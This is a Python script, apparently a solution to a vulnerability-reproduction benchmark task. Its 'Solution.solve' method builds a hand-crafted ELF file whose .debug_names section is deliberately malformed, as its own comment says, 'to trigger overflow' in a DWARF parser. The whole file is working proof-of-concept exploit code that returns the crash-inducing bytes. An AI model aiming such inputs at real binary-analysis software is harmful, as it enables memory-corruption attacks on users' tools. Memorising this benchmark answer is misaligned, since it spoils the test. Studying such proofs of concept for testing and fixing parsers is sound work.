import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # ELF header
        e_ident = b'\x7fELF\x02\x01\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
        e_type = struct.pack('<H', 1)
        e_machine = struct.pack('<H', 0x3e)
        e_version = struct.pack('<I', 1)
        e_entry = b'\x00' * 8
        e_phoff = b'\x00' * 8
        e_shoff = struct.pack('<Q', 159)
        e_flags = b'\x00' * 4
        e_ehsize = struct.pack('<H', 64)
        e_phentsize = struct.pack('<H', 0)
        e_phnum = struct.pack('<H', 0)
        e_shentsize = struct.pack('<H', 64)
        e_shnum = struct.pack('<H', 3)
        e_shstrndx = struct.pack('<H', 1)
        elf_header = e_ident + e_type + e_machine + e_version + e_entry + e_phoff + e_shoff + e_flags + e_ehsize + e_phentsize + e_phnum + e_shentsize + e_shnum + e_shstrndx

        # .shstrtab data
        shstrtab_data = b'.shstrtab\x00.debug_names\x00'

        # .debug_names data (malformed to trigger overflow)
        name_count = 1
        unit_length_64 = 60
        debug_names_data = (
            b'\xff\xff\xff\xff' +
            struct.pack('<Q', unit_length_64) +
            struct.pack('<H', 5) +
            struct.pack('<H', 0) +
            (struct.pack('<Q', 0) * 4) +  # comp_unit_count, local_type_unit_count, foreign_type_unit_count, bucket_count
            struct.pack('<Q', name_count) +
            struct.pack('<Q', 0) +  # abbrev_table_size
            b'\x00' +  # augmentation string (empty)
            b'\x00' * 7  # padding to 8-byte alignment
        )

        # Section headers
        null_sh = b'\x00' * 64

        shstrtab_sh = (
            struct.pack('<I', 0) +  # sh_name
            struct.pack('<I', 3) +  # sh_type SHT_STRTAB
            struct.pack('<Q', 0) +  # sh_flags
            struct.pack('<Q', 0) +  # sh_addr
            struct.pack('<Q', 64) +  # sh_offset
            struct.pack('<Q', 23) +  # sh_size
            struct.pack('<I', 0) +  # sh_link
            struct.pack('<I', 0) +  # sh_info
            struct.pack('<Q', 1) +  # sh_addralign
            struct.pack('<Q', 0)    # sh_entsize
        )

        debug_sh = (
            struct.pack('<I', 10) +  # sh_name
            struct.pack('<I', 1) +  # sh_type SHT_PROGBITS
            struct.pack('<Q', 0) +  # sh_flags
            struct.pack('<Q', 0) +  # sh_addr
            struct.pack('<Q', 87) +  # sh_offset
            struct.pack('<Q', 72) +  # sh_size
            struct.pack('<I', 0) +  # sh_link
            struct.pack('<I', 0) +  # sh_info
            struct.pack('<Q', 1) +  # sh_addralign
            struct.pack('<Q', 0)    # sh_entsize
        )

        sh_table = null_sh + shstrtab_sh + debug_sh

        # Full file
        poc = elf_header + shstrtab_data + debug_names_data + sh_table
        return poc